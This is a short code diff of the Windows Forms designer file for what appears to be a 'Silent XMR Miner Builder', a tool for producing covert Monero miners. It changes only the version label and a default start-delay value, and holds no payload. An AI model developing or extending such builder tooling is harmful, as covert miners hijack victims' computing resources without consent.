@@ -346,7 +346,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent XMR Miner Builder 1.3.1"
+        Me.MephForm1.Text = "Silent XMR Miner Builder 1.3.2"
         '
         'MephTabcontrol2
         '
@@ -1318,7 +1318,7 @@ Partial Class Form1
         Me.txtStartDelay.Name = "txtStartDelay"
         Me.txtStartDelay.Size = New System.Drawing.Size(34, 24)
         Me.txtStartDelay.TabIndex = 55
-        Me.txtStartDelay.Text = "30"
+        Me.txtStartDelay.Text = "15"
         Me.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtStartDelay.UseSystemPasswordChar = False
         Me.txtStartDelay.WordWrap = False
